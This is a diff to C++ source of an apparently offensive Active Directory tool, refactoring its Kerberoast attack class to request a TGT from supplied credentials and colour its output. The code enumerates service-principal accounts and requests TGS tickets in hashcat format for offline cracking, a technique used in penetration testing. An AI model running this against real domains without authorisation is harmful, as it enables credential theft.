@@ -4,8 +4,11 @@
 #include <string>
 #include <vector>
 #include "../connections/KerberosInteraction.h"
+#include "../utils/Colors.h"
 
-Attacks::Kerberoast::Kerberoast(LDAPConnection& _conn) : conn(_conn) {}
+Attacks::Kerberoast::Kerberoast(LDAPConnection& _conn, const std::string& username, const std::string& password) : conn(_conn) {
+    krb5.requestTGT(username, password);
+}
 
 std::vector<std::string> Attacks::Kerberoast::listUser(const std::string& baseDN) {
     std::cout << "[*] Enumerating kerberoastable users" << std::endl;
@@ -26,7 +29,7 @@ std::vector<std::string> Attacks::Kerberoast::listUser(const std::string& baseDN
             if (username == "krbtgt") {
                 continue;
             }
-            std::cout << "  [+] User: " << username << std::endl;
+            std::cout << Colors::COLOR_YELLOW << "  [+] User: " << username << Colors::COLOR_RESET << std::endl;
             kerberoastable_users.push_back(username);
             if (spn != userObject.end()) {
                 for (const auto& _spn : spn->second) {
@@ -42,7 +45,6 @@ std::pair<std::string, std::string> Attacks::Kerberoast::requestTicket(
     const std::string& username_spn, const std::string& username, 
     bool to_file) {
     
-    KerberosInteraction krb5;
     std::pair<std::string, std::string> to_save;
     std::string hashcat_ticket = krb5.requestTGS(username_spn, username);
     if (!to_file) {
